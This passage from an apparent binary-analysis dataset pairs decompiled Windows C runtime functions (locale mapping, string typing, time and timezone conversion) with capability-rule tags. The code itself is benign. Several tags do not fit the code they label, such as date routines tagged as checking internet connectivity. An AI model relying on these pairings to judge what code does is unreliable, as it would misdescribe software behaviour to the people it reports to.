                iVar7 = fcn.0041a164(1, 0x4566e8, 0x7f, &uStack396, iStack404, *0x4673b0, 1, unaff_EDI, \n                                             unaff_EBX, in_stack_fffffe3c, in_stack_fffffe40, in_stack_fffffe44, \n                                             in_stack_fffffe48, arg_1ch, in_stack_fffffe50);\n                        if (iVar7 == 0) {\n                            *0x464674 = 0;\n                        }\n                        else {\n                            uVar8 = 0;\n                            do {\n                                auStack395[uVar8 * 2] = auStack395[uVar8 * 2] & 1;\n                                uVar8 = uVar8 + 1;\n                            } while (uVar8 < 0x7f);\n                            iVar7 = fcn.00412110(&uStack396, \n                                                 L\"        h((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10 \"\n                                                 , 0xfe);\n                            *0x464674 = iVar7 == 0;\n                        }\n                        *0x464670 = *0x4673c0;\n                        uVar8 = *0x464674;\n                    }\n                }\n                *0x4647f0 = uVar8;\n                if (unaff_ESI == 1) {\n                    *0x4673c4 = iStack404;\n                }\n                iVar7 = (**(iVar9 + 0x4647b0))();\n                if (iVar7 == 0) {\n                    if (arg_8h != 0x464610) {\n                        fcn.00411031(arg_8h);\n                    }\n                }\n                else {\n                    *(iVar9 + 0x4647ac) = arg_8h;\n                    fcn.00411031(iVar4);\n                    *puVar1 = arg_1ch;\n                    *0x4673c0 = iVar3;\n                }\n            }\n        }\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1473
    },
    "00419a59": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419a59(char *param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iStack152;\n    int32_t iStack144;\n    uchar auStack140 [132];\n    uint uStack8;\n    \n    uStack8 = *0x4640c8;\n    if (param_2 != 0) {\n        if (param_1 != NULL) {\n            fcn.004197ca(param_1);\n        }\n        goto code_r0x00419b93;\n    }\n    bVar1 = true;\n    iStack144 = 0;\n    if (param_1 != NULL) {\n        if (((*param_1 == 'L') && (param_1[1] == 'C')) && (param_1[2] == '_')) {\n            do {\n                pcVar2 = fcn.0041b060(param_1, 0x4567c8);\n                if (((pcVar2 == NULL) || (iVar3 = pcVar2 - param_1,  iVar3 == 0)) || (*pcVar2 == ';'))\n                goto code_r0x00419b93;\n                iStack152 = 1;\n                puVar5 = 0x4647b4;\n                do {\n                    iVar4 = fcn.0041ea50(*puVar5, param_1, iVar3);\n                    if ((iVar4 == 0) && (iVar4 = fcn.00411cb0(*puVar5),  iVar3 == iVar4)) break;\n                    iStack152 = iStack152 + 1;\n                    puVar5 = puVar5 + 3;\n                } while (puVar5 < 0x4647e5);\n                pcVar2 = pcVar2 + 1;\n                iVar3 = fcn.0041a3a0(pcVar2, 0x4520f8);\n                if ((iVar3 == 0) && (*pcVar2 != ';')) goto code_r0x00419b93;\n                if (iStack152 < 6) {\n                    fcn.0041c4a0(auStack140, pcVar2, iVar3);\n                    auStack140[iVar3] = 0;\n                    iVar4 = fcn.004197ca(auStack140);\n                    if (iVar4 != 0) {\n                        iStack144 = iStack144 + 1;\n                    }\n                }\n            } while ((pcVar2[iVar3] != '\\0') && (param_1 = pcVar2 + iVar3 + 1,  *param_1 != '\\0'));\n        }\n        else {\n            iVar3 = fcn.0041966e(param_1, auStack140, 0, 0);\n            if (iVar3 == 0) goto code_r0x00419b93;\n            puVar5 = 0x4647ac;\n            do {\n                if (puVar5 != 0x4647ac) {\n                    iVar3 = fcn.00418650(auStack140, *puVar5);\n                    if ((iVar3 == 0) || (iVar3 = fcn.004197ca(auStack140),  iVar3 != 0)) {\n                        iStack144 = iStack144 + 1;\n                    }\n                    else {\n                        bVar1 = false;\n                    }\n                }\n                puVar5 = puVar5 + 3;\n            } while (puVar5 < 0x4647e9);\n            if (bVar1) {\n                fcn.004195af();\n                fcn.00411031(*0x4647ac);\n                *0x4647ac = 0;\n                goto code_r0x00419b93;\n            }\n        }\n        if (iStack144 == 0) goto code_r0x00419b93;\n    }\n    fcn.004195af();\ncode_r0x00419b93:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 891
    },
    "00419da8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_38h_2\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: lpSrcStr\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h_2\n// WARNING: Variable defined which should be unmapped: var_3ch_2\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h_2\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.00419da8(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint CodePage, uint arg_24h, uint arg_8h, \n            uint arg_ch, uint arg_10h, uint cchSrc, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *lpMultiByteStr_00;\n    int32_t unaff_EBP;\n    uchar *arg_8h_00;\n    uint var_2ch;\n    uint var_48h;\n    uint var_24h_2;\n    uint var_40h;\n    uint lpWideCharStr;\n    uint lpDestStr;\n    uint cchDest;\n    uint var_20h_2;\n    uint var_24h_3;\n    uint var_28h;\n    uint var_24h;\n    uint Locale;\n    uint dwMapFlags;\n    uint lpMultiByteStr;\n    uint cbMultiByte;\n    uint var_18h_2;\n    uint var_4h;\n    uint uVar5;\n    uint uVar6;\n    uint var_38h_2;\n    uint var_34h;\n    uint var_30h_2;\n    uint var_20h;\n    uint lpSrcStr;\n    uint var_44h;\n    uint var_40h_2;\n    uint var_3ch_2;\n    uint var_38h;\n    uint var_54h;\n    uint var_30h;\n    \n    fcn.00412580();\n    if (*0x4673c8 == 0) {\n        lpSrcStr = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x4673c8 = 2;\n            }\n        }\n        else {\n            *0x4673c8 = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        iVar1 = *(unaff_EBP + 0x14);\n        pcVar2 = *(unaff_EBP + 0x10);\n        do {\n            iVar1 = iVar1 + -1;\n            if (*pcVar2 == '\\0') goto code_r0x00419e0e;\n            pcVar2 = pcVar2 + 1;\n        } while (iVar1 != 0);\n        iVar1 = -1;\ncode_r0x00419e0e:\n        *(unaff_EBP + 0x14) = *(unaff_EBP + 0x14) + (-1 - iVar1);\n    }\n    if ((*0x4673c8 != 2) && (*0x4673c8 != 0)) {\n        if (*0x4673c8 != 1) goto code_r0x0041a15b;\n        *(unaff_EBP + -0x2c) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0;\n        if (*(unaff_EBP + 0x20) == 0) {\n            *(unaff_EBP + 0x20) = *0x4673c0;\n        }\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x30) = iVar1;\n        if (iVar1 == 0) goto code_r0x0041a15b;\n        *(unaff_EBP + -4) = 1;\n        fcn.004112a0();\n        *(unaff_EBP + -0x18) = &fcn.00419da8::lpSrcStr;\n        *(unaff_EBP + -0x1c) = &fcn.00419da8::lpSrcStr;\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x1c) == 0) {\n            iVar3 = fcn.0041101f();\n            *(unaff_EBP + -0x1c) = iVar3;\n            if (iVar3 == 0) goto code_r0x0041a15b;\n            *(unaff_EBP + -0x38) = 1;\n        }\n        var_30h_2 = 1;\n        var_34h = *(unaff_EBP + 0x20);\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, 0, 0);\n            *(unaff_EBP + -0x2c) = iVar3;\n            if (iVar3 != 0) {\n                if ((*(unaff_EBP + 0xd) & 4) == 0) {\n                    *(unaff_EBP + -4) = 2;\n                    fcn.004112a0();\n                    *(unaff_EBP + -0x18) = &fcn.00419da8::var_34h;\n                    *(unaff_EBP + -0x20) = &fcn.00419da8::var_34h;\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    if (*(unaff_EBP + -0x20) == 0) {\n                        iVar4 = fcn.0041101f(iVar3 * 2);\n                        *(unaff_EBP + -0x20) = iVar4;\n                        if (iVar4 == 0) goto code_r0x00419fdd;\n                        *(unaff_EBP + -0x34) = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                                      (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, \n                                       *(unaff_EBP + -0x20), iVar3);\n                    if (iVar1 != 0) {\n                        if (*(unaff_EBP + 0x1c) == 0) {\n                            uVar6 = 0;\n                            uVar5 = 0;\n                        }\n                        else {\n                            uVar6 = *(unaff_EBP + 0x1c);\n                            uVar5 = *(unaff_EBP + 0x18);\n                        }\n                        (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0x20), 0, *(unaff_EBP + -0x20), iVar3, uVar5, uVar6, 0, 0);\n                    }\n                }\n                else if ((*(unaff_EBP + 0x1c) != 0) && (iVar3 <= *(unaff_EBP + 0x1c))) {\n                    (*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, *(unaff_EBP + 0x18), \n                               *(unaff_EBP + 0x1c));\n                }\n            }\n        }\ncode_r0x00419fdd:\n        if (*(unaff_EBP + -0x34) != 0) {\n            fcn.00411031(*(unaff_EBP + -0x20));\n        }\n        if (*(unaff_EBP + -0x38) != 0) {\n            fcn.00411031(*(unaff_EBP + -0x1c));\n        }\n        goto code_r0x0041a15b;\n    }\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x3c) = 0;\n    if (*(unaff_EBP + 8) == 0) {\n        *(unaff_EBP + 8) = *0x4673b0;\n    }\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x4673c0;\n    }\n    iVar1 = fcn.0041ea89(*(unaff_EBP + 8));\n    *(unaff_EBP + -0x40) = iVar1;\n    if (iVar1 == -1) goto code_r0x0041a15b;\n    if (iVar1 == *(unaff_EBP + 0x20)) {\n        lpSrcStr = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n    }\n    else {\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = fcn.0041eacc(lpSrcStr, iVar1, *(unaff_EBP + 0x10), unaff_EBP + 0x14, 0, 0, 0x4567e0, 0x38);\n        *(unaff_EBP + -0x28) = iVar1;\n        if (iVar1 == 0) goto code_r0x0041a15b;\n        uVar6 = *(unaff_EBP + 0xc);\n        lpSrcStr = *(unaff_EBP + 8);\n        lpMultiByteStr_00 = &fcn.00419da8::lpSrcStr;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n        *(unaff_EBP + -0x24) = iVar1;\n        arg_8h_00 = NULL;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.004112a0();\n            *(unaff_EBP + -0x18) = &fcn.00419da8::lpSrcStr;\n            *(unaff_EBP + -0x44) = &fcn.00419da8::lpSrcStr;\n            fcn.00411850();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                lpMultiByteStr_00 = fcn.0041101f();\n                arg_8h_00 = lpMultiByteStr_00;\n                if (lpMultiByteStr_00 == NULL) goto code_r0x0041a123;\n                fcn.00411850();\n                *(unaff_EBP + -0x3c) = 1;\n            }\n            var_30h_2 = *(unaff_EBP + 0xc);\n            var_34h = *(unaff_EBP + 8);\n            iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n            *(unaff_EBP + -0x24) = iVar1;\n            arg_8h_00 = lpMultiByteStr_00;\n            if (iVar1 != 0) {\n                var_30h_2 = *(unaff_EBP + 0x20);\n                var_34h = *(unaff_EBP + -0x40);\n                fcn.0041eacc(var_34h, var_30h_2, lpMultiByteStr_00, unaff_EBP + -0x24, *(unaff_EBP + 0x18), \n                             *(unaff_EBP + 0x1c), lpSrcStr, uVar6);\n            }\n        }\ncode_r0x0041a123:\n        if (*(unaff_EBP + -0x3c) != 0) {\n            fcn.00411031(arg_8h_00);\n        }\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        fcn.00411031(*(unaff_EBP + -0x28));\n    }\ncode_r0x0041a15b:\n    *(unaff_EBP + -0x58) = 0x41a163;\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 3033
    },
    "0041a164": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: lpCharType\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.0041a164(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_20h_2, \n            uint noname_7, uint arg_8h, uint lpMultiByteStr, uint cbMultiByte, uint arg_14h, uint CodePage, uint arg_1ch\n            , uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint *arg_8h_00;\n    uint uVar2;\n    int32_t noname_1_00;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    int32_t noname_0_00;\n    uint dwInfoType;\n    uint var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_4h;\n    uint var_2ch;\n    uint var_28h_2;\n    uint var_24h_2;\n    uint var_20h_2;\n    int32_t lpCharType;\n    int32_t var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00412580();\n    iVar3 = 0;\n    if (*0x4673cc == 0) {\n        var_38h = 0x41a18e;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x4673cc = 2;\n            }\n        }\n        else {\n            *0x4673cc = 1;\n        }\n    }\n    if ((*0x4673cc == 2) || (*0x4673cc == 0)) {\n        iVar1 = *(unaff_EBP + 0x1c);\n        if (*(unaff_EBP + 0x1c) == 0) {\n            iVar1 = *0x4673b0;\n        }\n        noname_0_00 = *(unaff_EBP + 0x18);\n        if (*(unaff_EBP + 0x18) == 0) {\n            noname_0_00 = *0x4673c0;\n        }\n        noname_1_00 = fcn.0041ea89(iVar1);\n        if (noname_1_00 != -1) {\n            if (noname_1_00 != noname_0_00) {\n                lpCharType = noname_0_00;\n                var_38h = noname_1_00;\n                iVar3 = fcn.0041eacc(noname_0_00, noname_1_00, *(unaff_EBP + 0xc), unaff_EBP + 0x10, 0, 0, 0x456808, \n                                     0x1c);\n                if (iVar3 == 0) goto code_r0x0041a315;\n                *(unaff_EBP + 0xc) = iVar3;\n            }\n            lpCharType = 0x41a306;\n            var_38h = iVar1;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeA)();\n            if (iVar3 != 0) {\n                lpCharType = iVar3;\n                fcn.00411031(iVar3);\n            }\n        }\n    }\n    else if (*0x4673cc == 1) {\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x4673c0;\n        }\n        var_38h = (*(unaff_EBP + 0x20) != 0) * 8 + 1;\n        lpCharType = *(unaff_EBP + 0x18);\n        arg_8h_00 = &fcn.0041a164::lpCharType;\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x28) = iVar3;\n        if (iVar3 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.004112a0();\n            *(unaff_EBP + -0x18) = &fcn.0041a164::lpCharType;\n            *(unaff_EBP + -0x2c) = &fcn.0041a164::lpCharType;\n            fcn.00411850(&fcn.0041a164::lpCharType, 0, iVar3 * 2);\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                arg_8h_00 = fcn.004136f2(2, iVar3);\n                if (arg_8h_00 == NULL) goto code_r0x0041a315;\n                *(unaff_EBP + -0x20) = 1;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 0x18), 1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), arg_8h_00, iVar3);\n            if (iVar3 != 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)(*(unaff_EBP + 8), arg_8h_00, iVar3, *(unaff_EBP + 0x14))\n                ;\n                *(unaff_EBP + -0x24) = uVar2;\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                fcn.00411031(arg_8h_00);\n            }\n        }\n    }\ncode_r0x0041a315:\n    *(unaff_EBP + -0x3c) = 0x41a31d;\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 1557
    },
    "0041a3e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041a3e6(int64_t *arg_8h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    bVar1 = false;\n    iVar5 = *(arg_8h + 4);\n    iVar4 = *arg_8h;\n    iVar8 = *arg_8h;\n    iVar2 = fcn.00414501();\n    if (((iVar5 < 0) || (0x1000 < iVar5)) || ((0xfff < iVar5 && (iVar4 != 0)))) {\n        return NULL;\n    }\n    if (*(iVar2 + 0x44) == 0) {\n        iVar3 = fcn.0041101f(0x24);\n        *(iVar2 + 0x44) = iVar3;\n        if (iVar3 != 0) goto code_r0x0041a44c;\n        piVar6 = 0x4673d0;\n    }\n    else {\ncode_r0x0041a44c:\n        piVar6 = *(iVar2 + 0x44);\n    }\n    iVar4 = fcn.00412930(iVar4, iVar5, 0x1e13380, 0);\n    var_4h = iVar4 + 0x46;\n    iVar5 = iVar4 + 0x45;\n    iVar7 = fcn.004128f0(iVar4, iVar4 >> 0x1f, 0xfffffe93, 0xffffffff);\n    iVar7 = fcn.004128f0(iVar7 - (((iVar4 + 0x171) / 400 - iVar5 / 100) + -0x11 + iVar5 / 4), 0x15180, 0);\n    iVar7 = iVar7 + iVar8;\n    iVar2 = iVar7;\n    if ((iVar7 < 0x100000000) && (iVar7 < 0)) {\n        iVar7 = iVar7 + 0x1e13380;\n        var_4h = iVar5;\n        if (((iVar5 % 4 != 0) || (iVar5 % 100 == 0)) && ((iVar4 + 0x7b1) % 400 != 0)) goto code_r0x0041a548;\n        iVar7 = CONCAT44((iVar7 >> 0x20) + (0xfffeae7f < iVar7), iVar2 + 0x1e28500);\n    }\n    else if (((var_4h % 4 != 0) || (var_4h % 100 == 0)) && ((iVar4 + 0x7b2) % 400 != 0)) goto code_r0x0041a548;\n    bVar1 = true;\ncode_r0x0041a548:\n    piVar6[5] = var_4h;\n    iVar5 = fcn.00412930(iVar7, 0x15180, 0);\n    piVar6[7] = iVar5;\n    iVar8 = fcn.004128f0(iVar5, iVar5 >> 0x1f, 0xfffeae80, 0xffffffff);\n    iVar5 = 0x4648b0;\n    if (!bVar1) {\n        iVar5 = 0x4648e4;\n    }\n    iVar2 = 1;\n    iVar4 = *(iVar5 + 4);\n    while (iVar4 < piVar6[7]) {\n        iVar2 = iVar2 + 1;\n        iVar4 = *(iVar5 + iVar2 * 4);\n    }\n    piVar6[4] = iVar2 + -1;\n    piVar6[3] = piVar6[7] - *(iVar5 + (iVar2 + -1) * 4);\n    iVar5 = fcn.00412930(*arg_8h, *(arg_8h + 4), 0x15180, 0);\n    piVar6[6] = (iVar5 + 4) % 7;\n    iVar5 = fcn.00412930(iVar8 + iVar7, 0xe10, 0);\n    piVar6[2] = iVar5;\n    iVar9 = fcn.004128f0(iVar5, iVar5 >> 0x1f, 0xfffff1f0, 0xffffffff);\n    iVar9 = iVar8 + iVar7 + iVar9;\n    iVar5 = fcn.00412930(iVar9, 0x3c, 0);\n    piVar6[1] = iVar5;\n    *piVar6 = iVar9 + iVar5 * -0x3c;\n    piVar6[8] = 0;\n    return piVar6;\n}\n",
        "token_count": 1124
    },
    "0041a60b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.0041a60b(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    char *pcVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00412580(0x456858, 0x18);\n    *(unaff_EBP + -0x20) = 0;\n    fcn.00416625(7);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = *0x4673c0;\n    *(unaff_EBP + -0x28) = *0x4673c0;\n    *0x4674a4 = 0;\n    *0x4648a4 = 0xffffffff;\n    *0x464898 = 0xffffffff;\n    pcVar4 = fcn.0041ec95(0x456854);\n    *(unaff_EBP + -0x24) = pcVar4;\n    if ((pcVar4 == NULL) || (*pcVar4 == '\\0')) {\n        if (*0x4674a8 != 0) {\n            fcn.00411031(*0x4674a8);\n            *0x4674a8 = 0;\n        }\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetTimeZoneInformation)(0x4673f8);\n        pcVar2 = _sym.imp.KERNEL32.dll_WideCharToMultiByte;\n        if (iVar5 != -1) {\n            *0x4674a4 = 1;\n            *0x464800 = *0x4673f8 * 0x3c;\n            if (*0x46743e != 0) {\n                *0x464800 = *0x464800 + *0x46744c * 0x3c;\n            }\n            if ((*0x467492 == 0) || (*0x4674a0 == 0)) {\n                *0x464804 = 0;\n                *0x464808 = 0;\n            }\n            else {\n                *0x464804 = 1;\n                *0x464808 = (*0x4674a0 - *0x46744c) * 0x3c;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                              (uVar3, 0, 0x4673fc, 0xffffffff, *0x464890, 0x3f, 0, unaff_EBP + -0x1c);\n            if ((iVar5 == 0) || (*(unaff_EBP + -0x1c) != 0)) {\n                **0x464890 = 0;\n            }\n            else {\n                (*0x464890)[0x3f] = 0;\n            }\n            iVar5 = (*pcVar2)(uVar3, 0, 0x467450, 0xffffffff, *0x464894, 0x3f, 0, unaff_EBP + -0x1c);\n            if ((iVar5 == 0) || (*(unaff_EBP + -0x1c) != 0)) {\n                **0x464894 = 0;\n            }\n            else {\n                (*0x464894)[0x3f] = 0;\n            }\n        }\n    }\n    else {\n        if (*0x4674a8 != 0) {\n            iVar5 = fcn.00418650(pcVar4, *0x4674a8);\n            if (iVar5 == 0) goto code_r0x0041a80f;\n            if (*0x4674a8 != 0) {\n                fcn.00411031(*0x4674a8);\n            }\n        }\n        iVar5 = fcn.00411cb0(pcVar4);\n        *0x4674a8 = fcn.0041101f(iVar5 + 1);\n        if (*0x4674a8 != 0) {\n            fcn.004190f0(*0x4674a8, pcVar4);\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041a826();\n            fcn.0041c4a0(*0x464890, pcVar4, 3);\n            (*0x464890)[3] = 0;\n            pcVar6 = pcVar4 + 3;\n            if (*pcVar6 == '-') {\n                *(unaff_EBP + -0x20) = 1;\n                pcVar6 = pcVar4 + 4;\n            }\n            *0x464800 = fcn.004127bc(pcVar6);\n            *0x464800 = *0x464800 * 0xe10;\n            for (; (cVar1 = *pcVar6,  cVar1 == '+' || (('/' < cVar1 && (cVar1 < ':')))); pcVar6 = pcVar6 + 1) {\n            }\n            if (*pcVar6 == ':') {\n                pcVar6 = pcVar6 + 1;\n                iVar5 = fcn.004127bc(pcVar6);\n                *0x464800 = *0x464800 + iVar5 * 0x3c;\n                for (; ('/' < *pcVar6 && (*pcVar6 < ':')); pcVar6 = pcVar6 + 1) {\n                }\n                if (*pcVar6 == ':') {\n                    pcVar6 = pcVar6 + 1;\n                    iVar5 = fcn.004127bc(pcVar6);\n                    *0x464800 = *0x464800 + iVar5;\n                    for (; ('/' < *pcVar6 && (*pcVar6 < ':')); pcVar6 = pcVar6 + 1) {\n                    }\n                }\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                *0x464800 = -*0x464800;\n            }\n            *0x464804 = *pcVar6;\n            if (*0x464804 == 0) {\n                **0x464894 = 0;\n            }\n            else {\n                fcn.0041c4a0(*0x464894, pcVar6, 3);\n                (*0x464894)[3] = 0;\n            }\n            goto code_r0x0041a8ad;\n        }\n    }\ncode_r0x0041a80f:\n    fcn.00410d32(unaff_EBP + -0x10, 0xffffffff);\ncode_r0x0041a8ad:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 1601
    },
    "0041a8b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0041a8b3(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, int32_t arg_28h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = arg_10h % 4;\n    if (arg_ch == 1) {\n        if (((iVar2 == 0) && (arg_10h % 100 != 0)) || ((arg_10h + 0x76c) % 400 == 0)) {\n            iVar4 = *(in_EAX * 4 + 0x4648ac);\n        }\n        else {\n            iVar4 = *(in_EAX * 4 + 0x4648e0);\n        }\n        iVar5 = iVar4 + 1;\n        iVar3 = (arg_10h * 0x16d + -0x63db + (arg_10h + -1) / 4 + iVar5 + ((arg_10h + 299) / 400 - (arg_10h + -1) / 100)\n                ) % 7;\n        iVar1 = (arg_14h * 7 - iVar3) + arg_18h;\n        if (iVar3 <= arg_18h) {\n            iVar5 = iVar4 + -6;\n        }\n        iVar5 = iVar5 + iVar1;\n        if (arg_14h == 5) {\n            if (((iVar2 == 0) && (arg_10h % 100 != 0)) || ((arg_10h + 0x76c) % 400 == 0)) {\n                iVar1 = *(in_EAX * 4 + 0x4648b0);\n            }\n            else {\n                iVar1 = 